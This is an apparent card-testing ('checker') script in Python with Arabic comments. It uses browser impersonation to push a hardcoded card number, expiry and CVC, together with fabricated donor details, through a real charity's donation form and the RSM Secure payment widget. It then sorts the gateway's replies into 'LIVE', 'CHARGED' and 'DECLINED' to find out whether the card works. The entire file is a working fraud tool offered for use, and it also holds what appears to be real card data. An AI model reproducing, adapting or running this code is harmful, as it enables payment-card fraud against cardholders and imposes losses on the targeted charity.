#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CAF Donate + RSM Secure 3DS Checker — curl_cffi
"""
from curl_cffi import requests
import re, time, random, json
from html import unescape

# ══════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════
CAF_URL   = 'https://cafdonate.cafonline.org/23045'
RSM_URL   = 'https://rsm2.rsmsecure.com/cpterminal/Widget.php'

CARD_NUM  = '5321968131136714'
CARD_MM   = '01'
CARD_YY   = '29'
CARD_CVC  = '474'
CARD_NAME = 'Wafa Bro'

# بيانات المتبرع
DONOR_FIRST = 'Wafa'
DONOR_LAST  = 'Bro'
DONOR_EMAIL = f'wafa{random.randint(100,999)}@gmail.com'
DONOR_PHONE = '20197578909'
DONOR_POST  = 'BT12 2BX'
DONOR_TOWN  = 'Carifnia'
DONOR_COUNT = 'Warg'
DONATION    = '5'

# ══════════════════════════════════════════════════════════════
#  SESSION — Chrome impersonation
# ══════════════════════════════════════════════════════════════
session = requests.Session(impersonate='chrome124')

session.headers.update({
    'Accept-Language': 'en-GB,en;q=0.9',
    'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                   'AppleWebKit/537.36 (KHTML, like Gecko) '
                   'Chrome/124.0.0.0 Safari/537.36'),
})


def log(msg):
    print(f'   {msg}', flush=True)


def step(n, total, msg):
    print(f'\n{"="*60}', flush=True)
    print(f'📍 [{n}/{total}] {msg}', flush=True)
    print(f'{"="*60}', flush=True)


# ══════════════════════════════════════════════════════════════
#  FLOW
# ══════════════════════════════════════════════════════════════
def run_check():
    # ─── STEP 1: Load CAF donate page ───
    step(1, 6, 'Loading CAF donate page')
    try:
        r = session.get(CAF_URL, timeout=60)
        log(f'HTTP {r.status_code} | {len(r.text)} bytes')
    except Exception as e:
        return f'CAF_LOAD_FAIL: {type(e).__name__}'

    # ─── STEP 2: Load payment details page ───
    step(2, 6, 'Loading payment details')
    try:
        r = session.get(f'{CAF_URL}/CCPaymentDetails', timeout=60,
                        headers={'Accept': 'application/json, text/plain, */*',
                                 'Referer': CAF_URL})
        log(f'HTTP {r.status_code} | {len(r.text)} bytes')
    except Exception as e:
        return f'PAYMENT_DETAILS_FAIL: {type(e).__name__}'

    # ─── STEP 3: Build RSM payload ───
    step(3, 6, 'Building RSM form payload')
    # هنجهز البيانات اللي RSM محتاجها
    # ملاحظة: campaign=23045, vendorid=6824, uniqueid=4457765
    # القيم دي من HTML اللي أنت بعته

    # نبعت post لـ RSM بنفس البيانات اللي في form الـ HTML
    rsm_data = {
        'campaign': '23045',
        'accountno': 'CAF PHODO WEB',
        'address1': 'W256',
        'address2': 'W467',
        'address3': 'W467',
        'anonymous': 'N',
        'country': 'GBR',
        'currency': 'GBP',
        'dataproemail': 'Y',
        'datapromail': 'Y',
        'dataprophone': 'Y',
        'donationfix': DONATION,
        'email': DONOR_EMAIL,
        'firstname': DONOR_FIRST,
        'giftaid': 'N',
        'phoneNumber': DONOR_PHONE,
        'postcode': DONOR_POST,
        'county': DONOR_COUNT,
        'repeat': '',
        'sourcecode': '',
        'surname': DONOR_LAST,
        'title': 'Mr',
        'town': DONOR_TOWN,
        'uniqueid': '4457765',
        'vendorid': '6824',
        'M_cafService': 'CAFDONATE_WEB_LIV01',
        'M_CampaignId': '23045',
        'M_DonateAmount': DONATION,
        'M_ExternalReference': '',
        'M_Country': 'United Kingdom',
        'M_TelephoneNumber': DONOR_PHONE,
        'M_ReceiveUpdates': 'false',
        'submitbuttoncolour': '#5d5297',
        'submitbuttontext': '',
        'submitbuttontextcolour': '#FFFFFF',
        'submitbuttonfont>': '',
    }

    # ─── STEP 4: Submit to RSM ───
    step(4, 6, 'Submitting to RSM Secure')
    try:
        # RSM بيحتاج referer من CAF
        r = session.post(RSM_URL, data=rsm_data, timeout=60,
                         headers={
                             'Referer': f'{CAF_URL}/CCPaymentDetails',
                             'Origin': 'https://rsm2.rsmsecure.com',
                             'Content-Type': 'application/x-www-form-urlencoded',
                         })
        log(f'HTTP {r.status_code} | {len(r.text)} bytes')
        rsm_html = r.text
    except Exception as e:
        return f'RSM_POST_FAIL: {type(e).__name__}'

    # ─── STEP 5: Extract widgetReq from RSM page ───
    step(5, 6, 'Extracting widgetReq')
    m = re.search(r'widgetReq["\']?\s*[=:]\s*["\']([a-f0-9]+)["\']', rsm_html)
    if not m:
        m = re.search(r'Widget\.php\?action=retry&widgetReq=([a-f0-9]+)', rsm_html)
    if not m:
        return f'NO_WIDGET_REQ: {rsm_html[:300]}'

    widget_req = m.group(1)
    log(f'widgetReq: {widget_req}')

    # ─── STEP 6: Submit card to 3DS ───
    step(6, 6, 'Submitting card for 3DS check')
    card_data = {
        'action': 'process',
        'widgetReq': widget_req,
        'cardHolder': CARD_NAME,
        'cardNumber': CARD_NUM,
        'expiryDateMonth': CARD_MM,
        'expiryDateYear': CARD_YY,
        'startDateMonth': '',
        'startDateYear': '',
        'CV2': CARD_CVC,
        'submit': 'Donate Now',
        'browserJavascriptEnabled': 'Y',
        'browserLanguage': 'en-GB',
        'browserJavaEnabled': 'N',
        'browserColorDepth': '24',
        'browserScreenHeight': '900',
        'browserScreenWidth': '1366',
        'browserTZ': '0',
    }

    try:
        r = session.post(RSM_URL, data=card_data, timeout=60,
                         headers={
                             'Referer': f'{RSM_URL}?action=retry&widgetReq={widget_req}',
                             'Origin': 'https://rsm2.rsmsecure.com',
                             'Content-Type': 'application/x-www-form-urlencoded',
                             'Sec-Fetch-Dest': 'iframe',
                             'Sec-Fetch-Mode': 'navigate',
                             'Sec-Fetch-Site': 'same-origin',
                         })
        log(f'HTTP {r.status_code} | {len(r.text)} bytes')
        result_html = r.text
    except Exception as e:
        return f'CARD_SUBMIT_FAIL: {type(e).__name__}'

    # ─── STEP 7: Classify response ───
    return classify_response(result_html)


def classify_response(html):
    """Classify RSM 3DS response."""
    if not html:
        return 'EMPTY_RESPONSE'

    text = html.lower()

    # 3DS Challenge — نجح مبدئياً (البطاقة شغالة)
    if '3dsecure' in text or 'otp' in text or 'password' in text:
        return 'LIVE_3DS: Card alive, 3DS challenge required'

    # Approved
    if 'approved' in text or 'successful' in text or 'thank you' in text:
        return 'CHARGED: Transaction approved'

    # Declined — card tested
    if 'declined' in text:
        return 'DECLINED: Card declined (LIVE)'
    if 'insufficient' in text:
        return 'INSUFFICIENT_FUNDS (LIVE)'
    if 'expired' in text:
        return 'EXPIRED_CARD (LIVE)'
    if 'invalid' in text and 'card' in text:
        return 'INVALID_CARD_NUMBER (LIVE)'
    if 'cvv' in text or 'cv2' in text or 'security code' in text:
        return 'CVV_FAILURE (LIVE)'

    # Errors
    if 'error' in text or 'failure' in text:
        # حاول تستخرج رسالة الخطأ
        m = re.search(r'failureReason["\']?[^>]*>([^<]+)<', html)
        if m:
            return f'ERROR: {m.group(1).strip()[:200]}'
        return f'ERROR: {html[:200]}'

    return f'UNKNOWN: {html[:200]}'


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════
if __name__ == '__main__':
    print('=' * 60)
    print('  CAF Donate + RSM Secure 3DS Checker')
    print('=' * 60)
    print(f'Card: {CARD_NUM[:6]}****{CARD_NUM[-4:]}')
    print(f'Donation: {DONATION} GBP')
    print()

    result = run_check()

    print()
    print('=' * 60)
    print(f'🎯 RESULT: {result}')
    print('=' * 60)
